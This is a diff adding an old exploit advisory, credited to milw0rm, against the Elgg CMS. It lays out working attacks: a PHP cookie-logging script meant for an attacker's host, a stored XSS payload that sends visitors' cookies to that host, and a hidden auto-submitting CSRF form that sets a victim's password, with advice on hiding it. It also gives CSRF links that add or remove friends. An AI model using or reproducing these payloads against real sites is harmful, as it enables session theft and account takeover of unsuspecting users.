@@ -1,0 +1,107 @@
+###################################################################################
+[+] CMS Elgg <1.00 (XSS;CSRF;Cambia Password)Multiple Remote Vulnerabilities
+[+] Discovered By ThE Lorddemon  lorddemon@zonartm.org
+[+] Vendor:http://elgg.org/
+[+] Greetings: Project MEMI-Bolivia, OpTix, RTM security Group http://zonartm.og
+###################################################################################
+	
+Change Password Remotely:
++++++++++++++++++++++++++
+1) You Must Register In ThE site.
+2) Login
+3) Create a new topic and then edit
+	http://www.sitiosocial.com/_templates/
+ 	
+Edit the new topic (Template) have the option to insert HTML, JavaScript
+##################################################################################
+Exploit& HTML Injection
+
+###Cookie Grabber#### 
+[+] Discovered By ThE Lorddemon
+[+] Vendor:http://elgg.org/
+##################################################################################
+PoC
+--
+Script to store cookies
+ <?php
+ $cookie = $_GET['cookie'];
+ $log = fopen("log.txt", "a");
+ fwrite($log, $cookie ."\n");
+ fclose($log);
+ ?>
+uploading to a host.Save as cookie.php
+
+[+]Exploit:
+   -------
+1) Register in The SIte
+2) add to the Template
+<script language='Javascript' src='http://localhost/cookie.php?cookie='+document.cooke></script>
+
+The victim would be anyone who comes to your blog.
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+###Change Pasword#### 
+[+] Discovered By ThE Lorddemon lorddemon@zonartm.org 
+[+] http://zonartm.org
+[+] Vendor:http://elgg.org/
+#######################################################################################################
+
+1) Register in The SIte
+2) add to the Template
+
+<body onload="document.forms.g.submit();">
+
+<iframe name="my_frame" ALING="BOTTOM"  scrolling=no width=1 heigth=1></iframe>
+
+<form method="POST" target="my_frame" action="http://www.sitiosocial.com/_userdetails/index.php" name="g" id="g">
+<input type=hidden name="name" value="">
+<input type=hidden name="email" value="">
+<input type=hidden name="moderation" value="no">
+<input type=hidden name="publiccoments" value="no">
+<input type=hidden name="receivenotifications" value="no">
+<input type=hidden name="password1" value="password">   <------ Eye with this
+<input type=hidden name="password2" value="password">   <------ Eye with this
+<input type=hidden name="flag[commentwall_access]" value="LOGGED_IN">
+<input type=hidden name="lang" value="">
+<input type=hidden name="flag[sidebarsidebar-profile]" value="yes">
+<input type=hidden name="flag[sidebarsidebar-communities]" value="yes">
+<input type=hidden name="flag[sidebarsidebar-blog]" value="yes">
+<input type=hidden name="flag[sidebarsidebar-friends]" value="yes">
+<input type=hidden name="visualeditor" value="yes">
+<input type=hidden name="action" value="userdetails:update">
+<input type=hidden name="id" value="id_victima">               <---------Eye with this
+<input type=hidden name="profile_id" value="id_victima">       <---------Eye with this
+</form>
+	 	
+It is better to send all the form inside a Div tag to pass unnoticed
+	
+The victim would be the user with the id.
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+###You Be More Popular, or remove the victim to Friends#### 
+[+] Discovered By ThE Lorddemon lorddemon@zonartm.org 
+[+] http://zonartm.org
+[+] Vendor:http://elgg.org/
+#################################################################################################################
+
+1) Register in The SIte
+2) Add to the Template
+
+http://www.sitioSocial.com/mod/friend/index.php?friends_name=[vacio]&action=friend&friend_id=[tu id]
+
+viewing parameters from the viewpoint of the attacker.
+
+Friends_name=is the user name who made you want to be your friend. (may be empty)
+Action= friend or unfriend.
+Friend_id=User ID. who is performing the action
+	
+You can also remove it with friends cuanquier user.
+
+http://www.sitioSocial.com/mod/friend/index.php?friends_name=[vacio]&action=Unfriend&friend_id=[id_victima]
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+# milw0rm.com [2009-06-22]
